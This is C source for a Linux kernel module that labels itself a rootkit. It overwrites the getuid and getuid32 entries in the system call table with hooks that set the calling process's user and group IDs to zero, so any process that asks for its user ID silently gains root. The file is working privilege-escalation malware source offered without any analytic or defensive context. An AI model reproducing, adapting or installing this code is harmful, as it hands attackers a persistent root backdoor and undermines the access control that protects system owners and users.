#define MODULE
#define __KERNEL__

#include <asm/current.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <linux/unistd.h>

extern void *sys_call_table[];

// replaced system calls
int (*orig_getuid)();
int (*orig_getuid32)();

void give_root(void)
{
	current->uid  = 0;
	current->gid  = 0;
	current->euid = 0;
	current->egid = 0;
}

int new_getuid()
{
	give_root();
	return (*orig_getuid)();
}

int new_getuid32()
{
	give_root();
	return (*orig_getuid32)();
}


int init_module(void)
{
	orig_getuid   = sys_call_table[__NR_getuid];
	orig_getuid32 = sys_call_table[__NR_getuid32];

	sys_call_table[__NR_getuid]   = new_getuid;
	sys_call_table[__NR_getuid32] = new_getuid32;

	printk("Rootkit registered.\n");

	return 0;
}

void cleanup_module(void)
{
	sys_call_table[__NR_getuid]   = orig_getuid;
	sys_call_table[__NR_getuid32] = orig_getuid32;

	printk("Rootkit unregistered.\n");
}

